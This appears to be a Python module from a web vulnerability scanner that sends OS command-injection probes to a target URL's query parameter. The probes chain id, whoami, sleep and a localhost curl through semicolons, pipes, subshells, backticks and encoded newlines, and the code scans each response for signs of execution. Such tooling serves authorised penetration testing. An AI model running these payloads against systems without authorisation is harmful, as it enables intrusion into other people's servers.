import httpx
import re

PAYLOADS = [
    ("semicolon", "; id", "uid="),
    ("pipe", "| id", "uid="),
    ("subshell", "$(id)", "uid="),
    ("backtick", "`id`", "uid="),
    ("newline", "%0Aid", "uid="),
    ("tab", "%09id", "uid="),
    ("sleep", "; sleep 3", ""),
    ("curl", "; curl http://127.0.0.1:1", ""),
    ("whoami", "| whoami", "root|admin|www"),
]


async def cmd_injection(target: str, param: str = "") -> dict:
    results = []
    async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
        for name, payload, indicator in PAYLOADS:
            url = f"{target.rstrip('/')}?{param or 'cmd'}={__import__('urllib').parse.quote(payload)}"
            try:
                resp = await client.get(url)
                found = bool(re.search(indicator, resp.text, re.I)) if indicator else False
                results.append({
                    "payload": name,
                    "injected": payload,
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "indicator_found": found,
                    "vulnerable": found,
                })
            except httpx.HTTPError as e:
                results.append({"payload": name, "error": str(e)})
    return {"target": target, "tests": results, "vulnerable": any(r.get("vulnerable") for r in results)}
